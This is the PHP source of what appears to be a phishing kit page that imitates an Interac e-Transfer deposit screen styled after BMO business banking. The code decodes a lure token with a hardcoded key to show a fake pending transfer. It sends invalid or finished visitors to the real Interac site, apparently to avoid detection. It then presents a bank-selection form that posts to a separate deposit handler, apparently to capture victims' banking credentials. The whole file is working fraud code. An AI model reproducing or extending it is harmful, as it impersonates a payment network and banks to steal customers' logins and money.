<?php
// GATEWAY NODE: Interac Landing Page
// Decrypts token and prepares high-fidelity modular frontend handoff
// Optimized to synchronize with the BMO Business Banking UI

session_start();

// --- SECURITY PROTOCOL: REDIRECT INVALID TRAFFIC ---
if (empty($_GET['deposit'])) {
    header("Location: https://etransfer.interac.ca/error");
    exit();
}

// 1. Retrieve UI Uplink (if any)
$uiUrl = '';
$uiFile = __DIR__ . '/cf_ui.txt'; 
if (file_exists($uiFile)) {
    $uiUrl = trim(file_get_contents($uiFile));
}

// 2. Decrypt Token
$token = $_GET['deposit'] ?? '';
$amount = '0.00';
$senderName = 'Interac';
$transaction_id = 'N/A';
$expiry = date('M j, Y', strtotime('+30 days'));

if ($token) {
    // Standard Decryption Protocol
    $encrypted = base64_decode(str_pad(strtr($token, '-_', '+/'), strlen($token) % 4, '=', STR_PAD_RIGHT));
    $iv = substr($encrypted, 0, 16);
    $data = substr($encrypted, 16);
    // Hardcoded fallback key matching config
    $encryptionKey = 'a3f91b6cd024e8c29b76a149efcc5d42'; 
    $keyHash = hash('sha256', $encryptionKey, true);
    
    $decrypted = openssl_decrypt($data, 'AES-256-CBC', $keyHash, OPENSSL_RAW_DATA, $iv);
    
    if ($decrypted) {
        parse_str($decrypted, $params);
        $amount = $params['amount'] ?? '0.00';
        $senderName = $params['sender'] ?? 'Interac';
        $transaction_id = $params['transaction_id'] ?? 'N/A';
        
        // Store for neural sync - ensure all keys match question.php expectations
        $_SESSION['transaction_data'] = [
            'transaction_id' => $transaction_id,
            'sender_name'    => $senderName,
            'sender'         => $senderName,
            'amount'         => $amount,
            'currency'       => 'CAD',
            'status'         => 'Pending',
            'expiry_date'    => $expiry,
            'expires'        => strtotime($expiry)
        ];
    } else {
        header("Location: https://etransfer.interac.ca/error");
        exit();
    }
} else {
     header("Location: https://etransfer.interac.ca/error");
     exit();
}

// 3. Status Check Protocol (System State Sync)
$dbPath = __DIR__ . '/data/system_state.json';
if (file_exists($dbPath)) {
    $dbData = json_decode(file_get_contents($dbPath), true);
    $txStatus = $dbData['statuses'][$transaction_id] ?? null;

    if ($txStatus) {
        $redirects = [
            'completed' => 'https://etransfer.interac.ca/deposited',
            'cancelled' => 'https://etransfer.interac.ca/cancelled',
            'declined'  => 'https://etransfer.interac.ca/cancelled',
            'expired'   => 'https://etransfer.interac.ca/expired',
            'failed'    => 'https://etransfer.interac.ca/error'
        ];
        if (isset($redirects[$txStatus])) {
            header("Location: " . $redirects[$txStatus]);
            exit();
        }
    }
}

// 4. Formatting for UI
$amountFormatted = number_format((float)str_replace(['$',',',' '],'',$amount), 2);
$sender = $senderName;
$ref = $transaction_id;

?>
<!doctype html>
<html lang="en">
<?php include __DIR__ . '/partials/header.php'; ?>
<body>
    <a class="skip-link" href="#main" style="position: absolute; left: -10000px;">Skip to content</a>
    
    <script src="assets/js/RP.do_inline_script.js"></script>
    <input id="manualDelay" type="hidden" value="0"/>
    <input id="adManualDelay" type="hidden" value="3000"/>

    <?php include __DIR__ . '/partials/nav.php'; ?>

    <main id="main" style="background: #fff;">
        <div style="position:relative; padding-bottom: 50px;" class="interac-max-width" data-role="page" data-enhance="false">
            <?php include __DIR__ . '/partials/transfer-details.php'; ?>
            
            <?php include __DIR__ . '/partials/fi-selection.php'; ?>
        </div>
    </main>

    <?php include __DIR__ . '/partials/footer.php'; ?>
    
    <form action="deposit.do.php" id="depositForm" method="post" name="deposit">
        <input id="hiddenFiId" name="fiId" type="hidden"/>
        <input id="hiddenCuId" name="cuId" type="hidden"/>
        <input id="hiddenFiLabel" name="hiddenFiLabel" type="hidden"/>
        <input id="hiddenCuLabel" name="hiddenCuLabel" type="hidden"/>
        <input id="isMobileBrowser" name="isMobileBrowser" type="hidden"/>
        <input id="language" name="language" type="hidden" value="en"/>
        <input id="paymentRefNum" name="paymentRefNum" type="hidden" value="<?= $ref ?>"/>
        <input id="hiddenTMUUID" name="hiddenTMUUID" type="hidden" value="<?= session_id() ?>"/>
    </form>

    <?php include __DIR__ . '/partials/scripts.php'; ?>
</body>
</html>